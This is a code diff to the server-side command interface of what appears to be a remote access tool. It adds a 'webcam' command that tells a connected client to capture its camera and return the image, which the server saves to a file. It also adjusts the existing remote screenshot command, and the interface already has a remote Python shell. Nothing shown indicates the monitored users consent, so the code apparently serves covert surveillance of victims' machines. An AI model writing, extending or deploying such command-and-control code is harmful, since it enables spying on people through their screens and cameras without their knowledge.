@@ -126,6 +126,8 @@ class ServerCLI(BaseServer):
                 self.python_cli(client)
             case 'screenshot':
                 self.screenshot(client)
+            case 'webcam':
+                self.webcam(client)
             case _:
                 print('Command was not recognized, type "help" for help.')
 
@@ -201,19 +203,44 @@ class ServerCLI(BaseServer):
         """ Take a screenshot and save it in a file """
         logging.debug('Taking screenshot (%s)' % client.id)
         client.write(b'SCREENSHOT')
-        img_data = client.read()
+        client.conn.settimeout(120)
+        try:
+            img_data = client.read()
+        finally:
+            client.conn.settimeout(socket.getdefaulttimeout())
 
         if img_data.startswith(b'ERROR'):
             logging.error('Error taking screenshot (%s): %s' % (client.id, img_data.decode()))
             print(f'Error taking screenshot: {img_data.decode()}')
             return
 
-        file_name = 'screenshot' + str(datetime.now()).replace(':', '-') + '.png'
+        file_name = 'screenshot-' + str(datetime.now()).replace(':', '-') + '.png'
         with open(file_name, 'wb') as file:
             file.write(img_data)
         logging.info('Saved screenshot at (%s): %s' % (client.id, file_name))
         print(f'Saved screenshot: {file_name}')
-            
+
+    def webcam(self, client: Client) -> None:
+        """ Capture webcam """
+        logging.debug('Capturing webcam (%s)' % client.id)
+        client.write(b'WEBCAM')
+        client.conn.settimeout(120)
+        try:
+            img_data = client.read()
+        finally:
+            client.conn.settimeout(socket.getdefaulttimeout())
+
+        if img_data == b'ERROR':
+            logging.error('Unable to capture webcam (%s)' % client.id)
+            print('Unable to capture webcam')
+            return
+
+        file_name = 'webcam-' + str(datetime.now()).replace(':', '-') + '.png'
+        with open(file_name, 'wb') as file:
+            file.write(img_data)
+        logging.info('Saved webcam capture at (%s): %s' % (client.id, file_name))
+        print(f'Saved webca capture: {file_name}')
+
 
 if __name__ == '__main__':
 
